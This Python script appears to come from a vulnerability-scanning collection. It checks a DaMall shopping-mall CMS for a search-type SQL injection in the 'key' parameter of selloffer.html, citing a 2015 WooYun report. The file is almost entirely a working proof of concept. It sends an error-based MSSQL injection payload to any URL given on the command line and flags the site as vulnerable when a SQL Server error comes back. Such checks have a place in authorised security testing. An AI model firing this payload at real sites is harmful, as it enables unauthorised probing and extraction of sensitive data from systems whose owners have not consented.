#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: DaMall商城系统sql注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0115170
author: Lucifer
description: DaMall CMS文件selloffer.html?key参数存在搜索型SQL注入漏洞，可获取敏感信息。
'''
import sys
import requests
import warnings
from termcolor import cprint

class damall_selloffer_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/selloffer.html?key=%27AnD%20@@version=0%20or%27%%27=%27%"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if req.status_code == 500 and r"Microsoft SQL Server" in req.text:
                cprint("[+]存在damall商城系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = damall_selloffer_sqli_BaseVerify(sys.argv[1])
    testVuln.run()